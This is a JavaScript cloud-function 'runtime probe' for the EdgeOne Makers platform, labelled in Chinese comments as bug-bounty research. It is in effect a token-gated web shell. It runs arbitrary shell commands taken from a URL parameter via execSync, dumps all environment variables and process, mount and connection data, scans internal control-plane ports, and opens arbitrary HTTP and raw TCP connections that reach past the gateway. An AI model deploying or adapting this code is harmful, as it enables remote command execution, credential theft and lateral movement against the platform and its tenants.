// EdgeOne Makers Cloud Functions 运行时探针 v2（授权 SRC 研究用）
// ?k=TOKEN           基础沙箱报告
// ?k=TOKEN&c=ports   探测同容器 frame/sidecar 控制面端口
// ?k=TOKEN&c=log     查看本实例累计调用日志（验证暖实例跨请求状态保持）
const TOKEN = 'k9x2m7q4w8';

// ---- 模块级状态：暖实例内跨请求存活（冷启动重置）----
const BOOT = { t: new Date().toISOString(), pid: process.pid, host: process.env.HOSTNAME };
const INVOKE_LOG = [];

function trySync(fn) { try { return { ok: fn() }; } catch (e) { return { err: String(e && e.message || e) }; } }

async function readFileSafe(p) {
  try { const fs = await import('fs'); return fs.readFileSync(p, 'utf8').slice(0, 4000); }
  catch (e) { return '[ERR] ' + e.message; }
}

async function probePort(port, paths) {
  const out = [];
  for (const p of paths) {
    const t0 = Date.now();
    try {
      const r = await fetch(`http://127.0.0.1:${port}${p}`, { signal: AbortSignal.timeout(3000) });
      const body = (await r.text()).slice(0, 400);
      out.push({ port, path: p, status: r.status, ms: Date.now() - t0, body });
    } catch (e) {
      out.push({ port, path: p, err: String(e && e.message || e).slice(0, 120) });
    }
  }
  return out;
}

export default async function onRequest(context) {
  const request = context.request || context;
  const url = new URL(request.url);
  const k = url.searchParams.get('k');

  // 每次调用都记录（含未授权访问——能看到平台侧探测）
  const rec = {
    t: new Date().toISOString(),
    url: url.pathname + (url.searchParams.get('c') ? '?c=' + url.searchParams.get('c') : ''),
    auth: k === TOKEN,
    uuid: context.uuid || null,
    clientIp: context.clientIp || null,
    host: request.headers.get('host'),
    xScfRequestId: request.headers.get('x-scf-request-id'),
    xCubeRequestId: request.headers.get('x-cube-request-id'),
    eoLogUuid: request.headers.get('eo-log-uuid'),
    ua: request.headers.get('user-agent'),
    range: request.headers.get('range'),
  };
  INVOKE_LOG.push(rec);
  if (INVOKE_LOG.length > 200) INVOKE_LOG.shift();

  if (k !== TOKEN) return new Response(JSON.stringify({ err: 'bad token' }), { status: 403 });

  const cmd = url.searchParams.get('c') || 'report';

  // ---- 调用日志：验证暖实例状态保持 + 平台侧调用检测 ----
  if (cmd === 'log') {
    return new Response(JSON.stringify({ boot: BOOT, count: INVOKE_LOG.length, log: INVOKE_LOG }, null, 1),
      { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
  }

  // ---- 控制面端口探测：frame/sidecar 的本地 API ----
  if (cmd === 'ports') {
    const results = [];
    results.push(...await probePort(9000, ['/']));
    results.push(...await probePort(9001, ['/', '/v1/', '/runtime/invocation/next']));
    results.push(...await probePort(32000, ['/']));
    results.push(...await probePort(32001, ['/', '/health', '/metrics']));
    results.push(...await probePort(32002, ['/']));
    results.push(...await probePort(32003, ['/']));
    return new Response(JSON.stringify({ boot: BOOT, results }, null, 1),
      { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
  }

  // ---- 任意 TCP 连接测试（支持自定义 Host 头，探测虚拟主机路由）----
  if (cmd === 'dial') {
    const target = url.searchParams.get('to') || '';
    const hostHdr = url.searchParams.get('host') || '';
    const m = target.match(/^([a-z0-9.\-]+):(\d+)(\/.*)?$/i);
    if (!m) return new Response(JSON.stringify({ err: 'to=host:port[/path][&host=vhost]' }), { status: 400 });
    try {
      const headers = {};
      if (hostHdr) headers['Host'] = hostHdr;
      const r = await fetch(`http://${m[1]}:${m[2]}${m[3] || '/'}`, { headers, signal: AbortSignal.timeout(6000) });
      const body = await r.text();
      return new Response(JSON.stringify({
        target, hostHeader: hostHdr || null, status: r.status,
        respHeaders: Object.fromEntries(r.headers.entries()), body: body.slice(0, 3000),
      }, null, 1), { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
    } catch (e) {
      return new Response(JSON.stringify({ target, err: String(e && e.message || e) }, null, 1),
        { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
    }
  }


  // ---- 原始 TCP 拨测（绕过 fetch 层的 EO 网关劫持）----
  if (cmd === 'tcp') {
    const target = url.searchParams.get('to') || '';
    const m = target.match(/^([a-z0-9.\-]+):(\d+)(\/.*)?$/i);
    if (!m) return new Response(JSON.stringify({ err: 'to=host:port[/path][&host=vhost]' }), { status: 400 });
    const hostHdr = url.searchParams.get('host') || m[1];
    try {
      const net = await import('net');
      const raw = await new Promise((resolve, reject) => {
        const sock = net.connect({ host: m[1], port: parseInt(m[2]), timeout: 5000 });
        let buf = '';
        sock.on('connect', () => {
          sock.write(`GET ${m[3] || '/'} HTTP/1.1\r\nHost: ${hostHdr}\r\nUser-Agent: probe/1.0\r\nConnection: close\r\n\r\n`);
        });
        sock.on('data', d => { buf += d.toString(); if (buf.length > 6000) sock.destroy(); });
        sock.on('end', () => resolve(buf));
        sock.on('close', () => resolve(buf));
        sock.on('timeout', () => { sock.destroy(); resolve(buf || '[timeout, no data]'); });
        sock.on('error', e => reject(e));
      });
      return new Response(JSON.stringify({ target, hostHeader: hostHdr, raw: raw.slice(0, 5000) }, null, 1),
        { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
    } catch (e) {
      return new Response(JSON.stringify({ target, err: String(e && e.message || e) }, null, 1),
        { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
    }
  }

  // ---- 任意命令执行（系统 curl 不受 fetch 补丁影响）----
  if (cmd === 'exec') {
    const c = String(url.searchParams.get('cmd') || 'id');
    try {
      const cp = await import('child_process');
      const r = cp.execSync(c, { timeout: 15000, maxBuffer: 2 * 1024 * 1024 }).toString();
      return new Response(JSON.stringify({ cmd: c, out: r.slice(0, 20000) }, null, 1),
        { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
    } catch (e) {
      return new Response(JSON.stringify({ cmd: c, err: String(e && e.message || e), out: String(e && e.stdout || '').slice(0, 5000) }, null, 1),
        { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
    }
  }

  // ---- 基础报告（同 v1，精简）----
  const report = { t: new Date().toISOString(), boot: BOOT, route: url.pathname };
  report.process = trySync(() => ({
    pid: process.pid, ppid: process.ppid, version: process.version,
    platform: process.platform, arch: process.arch, cwd: process.cwd(),
    uid: process.getuid ? process.getuid() : null, uptime: process.uptime(),
  }));
  report.env = trySync(() => Object.fromEntries(Object.entries(process.env).sort()));
  report.fs = {
    mounts: await readFileSafe('/proc/mounts'),
    cgroup: await readFileSafe('/proc/self/cgroup'),
  };
  report.exec = await (async () => { try {
    const cp = await import('child_process');
    return { ok: {
      id: cp.execSync('id', { timeout: 5000 }).toString(),
      ps: cp.execSync('ps auxf 2>/dev/null || ps -ef', { timeout: 5000 }).toString().slice(0, 6000),
      conns: cp.execSync('ss -tnp 2>/dev/null || true', { timeout: 5000 }).toString().slice(0, 4000),
    } };
  } catch (e) { return { err: String(e && e.message || e) }; } })();
  report.reqHeaders = Object.fromEntries(request.headers.entries());
  return new Response(JSON.stringify(report, null, 1), {
    headers: { 'Content-Type': 'application/json; charset=utf-8' },
  });
}
